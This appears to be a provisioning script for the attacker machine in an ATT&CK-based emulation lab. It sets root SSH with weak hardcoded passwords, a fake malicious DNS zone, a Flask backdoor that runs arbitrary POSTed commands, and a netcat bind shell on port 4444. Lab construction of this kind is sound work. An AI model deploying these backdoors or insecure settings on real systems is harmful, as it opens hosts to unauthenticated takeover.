############### COSTARICTO

#
## Global commands
#
apt-get update
apt-get install -y python3 python3-pip sshpass curl socat

## SSH
apt-get install -y openssh-server
mkdir -p /var/run/sshd
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config

pgrep -x "sshd" > /dev/null || /usr/sbin/sshd & 


# Root password
echo 'root:RootPass123' | chpasswd

# User attacker

useradd -m attacker -s /bin/bash
mkdir -p /home/attacker
echo 'attacker:Passw0rd' | chpasswd
usermod -aG sudo attacker

# DebianUser
useradd -M  DebianUser
mkdir -p /home/DebianUser
echo 'DebianUser:DebianUser' | chpasswd
(echo 'DebianUser'; echo 'DebianUser') | smbpasswd -a -s DebianUser

pgrep -x "php-fpm8.4" > /dev/null || php-fpm8.4 &

################################################ End of Global Section
# T1046
apt-get -y install nmap

# T1105
apt-get install -y python3 python3-pip python3-venv curl netcat-openbsd
mkdir -p /home/attacker/tools
chown attacker:attacker /home/attacker/tools
cat > /home/attacker/tools/simple_http_server.py << 'EOF'
#!/usr/bin/env python3

import http.server
import socketserver
import sys

HOST = "0.0.0.0"
PORT = 8018

Handler = http.server.SimpleHTTPRequestHandler

try:
    with socketserver.TCPServer((HOST, PORT), Handler) as httpd:
        print(f"[*] HTTP server running on {HOST}:{PORT}")
        httpd.serve_forever()
except OSError:
    print(f"[!] Port {PORT} is already in use.")
    sys.exit(1)
except KeyboardInterrupt:
    print("\n[*] Server stopped.")
EOF
chmod +x /home/attacker/tools/simple_http_server.py

if ! ss -tuln | grep -q ":8018 "; then
    su attacker -c "python3 /home/attacker/tools/simple_http_server.py &"
else
    echo "Port 8018 already in use"
fi

# T1090.003

apt-get install -y tinyproxy
cat > /etc/tinyproxy/tinyproxy.conf << 'EOF'
Port 8888
Listen 0.0.0.0
Allow 172.22.0.20
ALLOW 172.21.0.10
Allow 172.21.0.20
EOF
if ! ss -tuln | grep -q ":8888 "; 
 then /usr/bin/tinyproxy -c /etc/tinyproxy/tinyproxy.conf &
 else echo "Port 8888 already in use";
 fi

# T1053.005
cat >> /var/www/html/backdor.sh << 'EOF'
#!/bin/bash
echo "if I wanted"
EOF

# T1588.002


# T1583.001 - Domains
if ! grep -q "zone \"maliciousdomain.local\"" /etc/bind/named.conf.local; then
    cat >> /etc/bind/named.conf.local << "EOF"
zone "maliciousdomain.local" {
  type master;
  file "/etc/bind/db.maliciousdomain";
};
EOF
fi
cat > /etc/bind/db.maliciousdomain << 'EOF'
$TTL 604800
@ IN SOA ns1.maliciousdomain.local. admin.maliciousdomain.local. (
  2 ; Serial
  604800 ; Refresh
  86400 ; Retry
  2419200 ; Expire
  604800 ) ; Negative Cache TTL
;
@ IN NS ns1.maliciousdomain.local.
ns1 IN A 172.21.0.20
www IN A 172.21.0.20
EOF
if pgrep -x "named" > /dev/null; then
    echo "✅ named is running. Restarting..."
    pkill named
    sleep 2
    named -g -c /etc/bind/named.conf &
    echo "✅ named restarted"
else
    echo "❌ named is not running. Starting..."
    named -g -c /etc/bind/named.conf &
    echo "✅ named started"
fi

# T1587.001

pip3 install --break-system-packages flask flask-cors requests
mkdir -p /home/attacker/malware
cat > /home/attacker/malware/backdoor.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request
app = Flask(__name__)
@app.route("/exec", methods=["POST"])
def exec_cmd():
 import subprocess
 cmd = request.form.get("cmd")
 if not cmd:
  return "No command", 400
 try:
  output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
  return output
 except Exception as e:
  return str(e), 500
if __name__ == "__main__":
 app.run(host="0.0.0.0", port=5055)
EOF
chown attacker:attacker /home/attacker/malware/backdoor.py
chmod +x /home/attacker/malware/backdoor.py

if ! ss -tuln | grep -q ":5055 "; then
 su attacker -c "python3 /home/attacker/malware/backdoor.py &"
 else echo "Port 5055 already in use";
fi

# T1005
apt-get install -y netcat-openbsd
cat << 'EOF' > /root/nc-listener.sh
# Alternative using named pipe
#!/bin/sh
rm -f /tmp/nc-pipe
mkfifo /tmp/nc-pipe
while true; do
    cat /tmp/nc-pipe | /bin/sh 2>&1 | nc -lk -p 4444 > /tmp/nc-pipe
done
EOF
chmod +x /root/nc-listener.sh
# Start listener in background

if ! ss -tuln | grep -q ":4444 "; then
  python3 /home/attacker/revshell.py &
 else echo "Port 4444 already in use";
fi


################################
